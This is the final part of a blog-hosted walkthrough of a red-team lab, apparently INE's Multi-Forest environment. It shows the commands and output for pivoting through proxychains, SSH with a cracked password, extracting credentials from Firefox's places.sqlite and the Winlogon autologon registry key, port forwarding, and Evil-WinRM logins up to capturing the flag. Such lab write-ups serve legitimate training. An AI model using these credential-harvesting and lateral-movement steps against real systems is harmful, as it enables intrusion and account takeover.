+<p><img src="https://assets.ine.com/cybersecurity-lab-images/3890101f-20b6-46a3-9301-5bd3f33601ac/image18.png" srcset="/img/loading.gif"></p>
+<p>We will now perform port scanning against the newly discovered IP address.</p>
+<h4 id="5-Jump-Srv"><a href="#5-Jump-Srv" class="headerlink" title="5. Jump-Srv"></a>5. Jump-Srv</h4><p>Let’s perform a TCP port scan against the target 10.10.3.3 [<strong>jump-srv.mgmt.corp</strong>] using nmap and leveraging the route to the 10.10.3.0/24 network.</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># Using meterpreter’s active route to “10.10.3.0/24” network on new bash shell</span><br><br>proxychains nmap --top-ports 10 -sT -sV -Pn 10.10.3.3<br>&lt;..SNIP..&gt;<br><br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.3.3<br>Host is up (2.4s latency).<br><br>PORT     STATE  SERVICE       VERSION<br>21/tcp   closed ftp<br>22/tcp   open   ssh           OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)<br>23/tcp   closed telnet<br>25/tcp   closed smtp<br>80/tcp   closed http<br>110/tcp  closed pop3<br><br>&lt;..SNIP..&gt;<br></code></pre></div></td></tr></table></figure>
+
+<p>SSH server is running on TCP port 22. As ‘<strong>jump-srv.mgmt.corp</strong>‘ machine is managed by “<strong>jump-admin</strong>“, we can try to do SSH to ‘<strong>10.10.3.3</strong>‘ machine using Jump-Admin Domain user.</p>
+<p>We successfully SSHed to Jump-SRV.mgmt.corp as the “<strong>jump-admin</strong>“ domain user. (Using the jump-admin cracked password ‘B@DB!tch’)</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/3890101f-20b6-46a3-9301-5bd3f33601ac/image19.png" srcset="/img/loading.gif"></p>
+<p>Let’s also extract the bookmark URLs of Firefox in this machine and look if any interesting information can be found (as jump-admin user).</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># As ‘Jump-admin’ domain user</span><br><span class="hljs-built_in">cd</span> ~/.mozilla/firefox/2s3p6m1v.default-release<br>sqlite3 places.sqlite<br><span class="hljs-comment"># Inside SQLite </span><br>.tables<br>select moz_places.url from moz_places;<br>.quit<br>found URL: https://admin-sys.site/login.asp?user=sys-admin&amp;pass=Rand0mlyS3l3ctedP@ss<br></code></pre></div></td></tr></table></figure>
+
+<p>However, using Firefox with proxychains to query the login URL shows that it is non-existent. Now enumerate the IP address of the admin-sys server by pinging the URL.</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ping admin-sys.site -c 1<br>PING admin-sys.site (192.168.1.2) 56(84) bytes of data.<br><br>--- admin-sys.site ping statistics ---<br>1 packets transmitted, 0 received, 100% packet loss, time 0ms<br></code></pre></div></td></tr></table></figure>
+
+<p>Performing a TCP port scan against the “<strong>192.168.1.2</strong>“ target reveals that the 5985 port is open, which means one can always do PowerShell Remoting.</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/3890101f-20b6-46a3-9301-5bd3f33601ac/image20.png" srcset="/img/loading.gif"></p>
+<h4 id="6-Admin-SYS"><a href="#6-Admin-SYS" class="headerlink" title="6. Admin-SYS"></a>6. Admin-SYS</h4><p>In order to perform PowerShell Remoting, we need to apply some port forwarding techniques.</p>
+<p>Exit the SSH session and re-establish a new session with port forwarding switches.</p>
+<p>Using port forwarding, we are specifying that all the traffic sent locally will be forwarded to the ‘<strong>admin-sys</strong>‘ server [192.168.1.2]</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">On</span> a <span class="hljs-built_in">new</span> bash <span class="hljs-keyword">session</span><br>𝑝𝑟𝑜𝑥𝑦𝑐ℎ𝑎𝑖𝑛𝑠 𝑠𝑠ℎ −𝑙 𝑗𝑢𝑚𝑝−𝑎𝑑𝑚𝑖𝑛@𝑀𝐺𝑀𝑇.𝐶𝑂𝑅𝑃 <span class="hljs-number">10.10</span><span class="hljs-number">.3</span><span class="hljs-number">.3</span> −𝐿 <span class="hljs-number">5985</span>:<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.2</span>:<span class="hljs-number">5985</span><br>(Now at this very particular <span class="hljs-type">point</span>, traffic <span class="hljs-keyword">from</span> your attacker machine can reach the <span class="hljs-keyword">admin</span>-sys machine)<br><br>Use Evil-WinRM <span class="hljs-keyword">to</span> <span class="hljs-keyword">connect</span> <span class="hljs-keyword">to</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.2</span> machine <span class="hljs-keyword">with</span> the discovered credentials<br>./𝑒𝑣𝑖𝑙−𝑤𝑖𝑛𝑟𝑚.𝑟𝑏 −𝑖 <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> −𝑢 𝑠𝑦𝑠−𝑎𝑑𝑚𝑖𝑛 −𝑝 𝑅𝑎𝑛𝑑<span class="hljs-number">0</span>𝑚𝑙𝑦𝑆<span class="hljs-number">3</span>𝑙<span class="hljs-number">3</span>𝑐𝑡𝑒𝑑𝑃@𝑠𝑠<br></code></pre></div></td></tr></table></figure>
+
+<p>Enumerating the environment reveals that “<strong>sys-admin”</strong> is a local user at the admin-sys server. Privilege escalation can be done by querying the autologin registry.</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/3890101f-20b6-46a3-9301-5bd3f33601ac/image21.png" srcset="/img/loading.gif"></p>
+<p>Clear Text credentials of Administrator are found, as follows..</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># On the recently established WinRM session </span><br><br>reg query <span class="hljs-string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;</span><br><br>&lt;..SNIP..&gt;<br><br>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon<br>    AutoRestartShell    REG_DWORD    <span class="hljs-number">0</span>x1<br>    Background    REG_SZ    <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span><br>    CachedLogonsCount    REG_SZ    <span class="hljs-number">10</span><br>    DebugServerCommand    REG_SZ    no<br>DefaultUserName    REG_SZ    Administrator<br>    DefaultDomainName    REG_SZ    WIN<span class="hljs-literal">-10</span><span class="hljs-literal">-PRO</span><span class="hljs-literal">-X64</span><br>    AutoAdminLogon    REG_SZ    <span class="hljs-number">1</span><br>    DefaultPassword    REG_SZ    Test@<span class="hljs-number">123</span><br><br>&lt;..SNIP..&gt;<br><br></code></pre></div></td></tr></table></figure>
+
+<p>Reconnect to the ‘<strong>admin-sys’</strong> server with local administrator credentials.</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">./evil<span class="hljs-literal">-winrm</span>.rb <span class="hljs-literal">-i</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-literal">-u</span> Administrator <span class="hljs-literal">-p</span> Test@<span class="hljs-number">123</span><br><br><span class="hljs-built_in">type</span> C:\Users\Administrator\Desktop\Triumph.txt<br><br>&lt;Result&gt;<br><br>CONGRATULATIONS, YOU HAVE SUCCESSFULLY COMPROMISED MULTI<span class="hljs-literal">-FOREST</span> RED TEAM ENVIRONMENT!!<br><br>&lt;<span class="hljs-number">3</span><br><br>&lt;/Result&gt;<br><br></code></pre></div></td></tr></table></figure>
+
+<p>Congratulations!!</p>
+<p>The Multi-Forest Red Team Environment is successfully compromised.</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/3890101f-20b6-46a3-9301-5bd3f33601ac/image22.png" srcset="/img/loading.gif"></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/killchains/">killchains</a>
+                    
+                  </div>
+                
+              </div>
+              
+                
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/06/22/%E6%94%BB%E5%87%BB%E9%93%BE%E4%B8%83%EF%BC%9A%E5%9F%9F%E6%B8%97%E9%80%8F%E6%A1%88%E4%BE%8B%E5%9B%9B/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">攻击链七：域渗透案例四</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/06/22/%E6%94%BB%E5%87%BB%E9%93%BE%E5%9B%9B%EF%BC%9A%E5%9F%9F%E6%B8%97%E9%80%8F%E6%A1%88%E4%BE%8B%E4%B8%80/">
+                        <span class="hidden-mobile">攻击链四：域渗透案例一</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+            
+
+                
+                  <a id="scroll-top-button" href="#" role="button">
+                    <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+                  </a>
+                  
+
+                    
+                      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+                        
+
+                          
+      </main>
+
+      <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://whale3070.github.io/" target="_blank" rel="nofollow noopener"><span>Whale3070</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+    </body>
+
+  </html>
